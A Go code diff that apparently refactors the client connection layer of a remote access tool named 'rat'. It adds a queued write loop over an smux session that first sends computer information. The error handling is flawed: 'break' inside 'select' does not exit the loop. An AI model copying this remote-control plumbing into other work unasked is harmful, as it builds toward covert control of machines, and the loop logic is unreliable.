@@ -4,7 +4,6 @@ import (
 	"encoding/binary"
 	"errors"
 	"rat/shared"
-	"rat/shared/network"
 	"rat/shared/network/header"
 
 	"github.com/xtaci/smux"
@@ -13,11 +12,9 @@ import (
 type Connection struct {
 	Conn    *smux.Session
 	control *smux.Stream
-	network.Writer
-	network.Reader
 }
 
-var Queue chan OutgoingPacket
+var Queue chan Outgoing
 
 func (c *Connection) Init() {
 	Queue <- &ComputerInfoPacket{}
@@ -27,23 +24,24 @@ func (c *Connection) Close() {
 	c.Conn.Close()
 }
 
-func (c *Connection) WriteHeader(header header.PacketHeader) error {
-	return binary.Write(c.control, shared.ByteOrder, header)
-}
+func (c *Connection) writeLoop() {
+	var err error
+	for {
+		select {
+		case p := <-Queue:
+			err = binary.Write(c.control, shared.ByteOrder, p.Header())
+			if err != nil {
+				break
+			}
 
-func (c *Connection) WritePacket(packet OutgoingPacket) error {
-	err := c.WriteHeader(packet.Header())
-
-	if err != nil {
-		return err
+			err = p.Write(c.control, c)
+			if err != nil {
+				break
+			}
+		}
 	}
 
-	return c.Writer.WritePacket(packet)
-}
-
-type OutgoingPacket interface {
-	Init()
-	Header() header.PacketHeader
+	c.Close()
 }
 
 func (c *Connection) recvLoop() {
